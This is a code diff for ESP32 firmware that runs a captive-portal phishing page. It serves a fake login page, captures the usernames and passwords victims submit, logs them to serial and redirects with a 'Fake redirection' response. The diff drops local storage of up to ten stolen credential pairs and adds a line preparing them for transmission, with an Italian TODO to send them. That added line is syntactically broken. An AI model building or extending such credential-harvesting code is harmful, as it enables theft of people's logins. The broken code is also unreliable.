@@ -3,10 +3,6 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <SPIFFS.h> // used to load page
-#include <Preferences.h>
-
-Preferences preferences;
-#define MAX_CREDENTIALS 10
 
 void setup_web_handler() {
     http_server.on("/", main_handler);
@@ -29,7 +25,7 @@ void captive_portal() {
 void main_handler() {
     File file = SPIFFS.open("/index.html", "r");
     if (!file || file.isDirectory()) {
-        http_server.send(500, "text/plain", "Login page not found");
+        http_server.send(404, "text/plain", "Login page not found");
         return;
     }
     http_server.streamFile(file, "text/html");
@@ -41,24 +37,13 @@ void submit_handler() {
         String username = http_server.arg("username");
         String password = http_server.arg("password");
 
-        preferences.begin("creds", false);
-        int count = preferences.getUInt("count", 0);
-
         Serial.print("Username: ");
         Serial.println(username);
         Serial.print("Password: ");
         Serial.println(password);
 
-        if (count < MAX_CREDENTIALS) {
-            preferences.putString("user" + String(count), username);
-            preferences.putString("pass" + String(count), password);
-            preferences.putUInt("count", count + 1);
-            Serial.printf("Saved credentials #%d\n", count);
-        } else {
-            Serial.println("Credential storage full");
-        }
-
-        preferences.end();
+        String to_transmit = username + " - " password
+        # TODO: Giuseppe trasmetti la variabile to_transmit se questo concatenamento funziona
 
         http_server.sendHeader("Location", "/");
         http_server.send(302, "text/plain", "Fake redirection");
